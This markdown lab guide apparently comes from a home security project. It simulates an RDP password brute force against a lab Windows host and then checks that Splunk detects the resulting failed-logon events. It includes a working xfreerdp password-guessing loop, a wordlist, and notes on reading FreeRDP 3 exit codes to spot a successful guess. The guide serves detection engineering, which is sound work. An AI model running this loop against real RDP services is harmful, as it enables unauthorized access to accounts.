# Attack Simulation: RDP Brute Force from Kali Linux

## Overview

| Field | Value |
|-------|-------|
| **MITRE ATT&CK** | [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/) |
| **Attack Machine** | Kali Linux (192.168.10.250) |
| **Target Machine** | Target-PC (192.168.10.100) |
| **Target Service** | RDP (TCP 3389) |
| **Target Accounts** | jsmith, tsmith |
| **Tool** | xfreerdp (FreeRDP 3.x) |

---

## Prerequisites

1. Target-PC has RDP enabled
2. Target-PC firewall allows inbound RDP:
   ```cmd
   netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
   ```
3. Target accounts (jsmith, tsmith) are in the Remote Desktop Users group
4. Kali has network connectivity to Target-PC (`ping 192.168.10.100`)

---

## Password Wordlist

Create the wordlist at `~/Desktop/ad-project/passwords.txt`:

```
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
nicole
daniel
babygirl
monkey
lovely
jessica
654321
michael
ashley
qwerty
GTh146pe!
```

The correct password (`GTh146pe!`) is placed last to maximize the number of failed attempts for detection purposes.

---

## Attack Commands

### Single User Brute Force

```bash
while IFS= read -r pass; do
  echo "Trying: $pass"
  timeout 10 xfreerdp /v:192.168.10.100 /u:tsmith /p:"$pass" /cert:ignore +auth-only 2>&1 |
  grep -q "exit status 1" && echo ">>> SUCCESS: $pass <<<" && break
done < ~/Desktop/ad-project/passwords.txt
```

### Manual Single Password Test

```bash
xfreerdp /v:192.168.10.100 /u:jsmith /p:'GTh146pe!' /cert:ignore
```

---

## Expected Output

### Failed Attempt (wrong password)
```
[ERROR][com.freerdp.core] - [freerdp_connect_begin]: Authentication only, exit status 0
```

### Successful Attempt (correct password)
```
[ERROR][com.freerdp.core] - [freerdp_connect_begin]: Authentication only, exit status 1
[ERROR][com.freerdp.core] - [freerdp_abort_connect_context]: ERRCONNECT_CONNECT_CANCELLED
```

> **Important:** FreeRDP 3.x reverses the exit codes from FreeRDP 2.x. Exit status 1 = success, exit status 0 = failure. This is why Crowbar 0.4.2 fails silently with FreeRDP 3.

---

## Telemetry Generated

Each failed attempt creates:
- **EventCode 4625** (Failed Logon) in Windows Security log on Target-PC

The successful attempt creates:
- **EventCode 4624** (Successful Logon) in Windows Security log on Target-PC
- **EventCode 4672** (Special Privileges Assigned) if the account has admin privileges

All events are forwarded to Splunk `endpoint` index via the Universal Forwarder.

---

## Detection Validation

After running the attack, verify in Splunk:

```spl
index=endpoint EventCode=4625 host="target-PC" earliest=-15m
| stats count by user, src_ip
```

Expected: ~20 failed logon events for the target user from 192.168.10.250.

See [detections/T1110.001_rdp-brute-force.md](../detections/T1110.001_rdp-brute-force.md) for the full detection writeup and analyst triage steps.
